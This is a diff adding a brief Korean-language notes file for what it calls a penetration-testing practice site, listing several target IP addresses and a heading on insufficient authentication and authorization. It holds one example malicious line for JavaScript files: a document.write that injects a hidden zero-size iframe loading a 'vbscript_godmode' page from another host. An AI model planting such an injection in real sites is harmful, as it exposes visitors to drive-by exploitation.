@@ -1,0 +1,25 @@
+#모의해킹 사이트
+#http://192.168.0.104/
+
+#js파일에 추가할 악성스크립 구문 예
+document.write("<iframe src='http://192.168.0.130/vbscript_godmode.html' width='0' height='0' frameboard='0'></iframe>");
+
+#불충분한 인증 및 인가
+#http://10.10.0.24/
+#http://61.39.155.24:50004/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
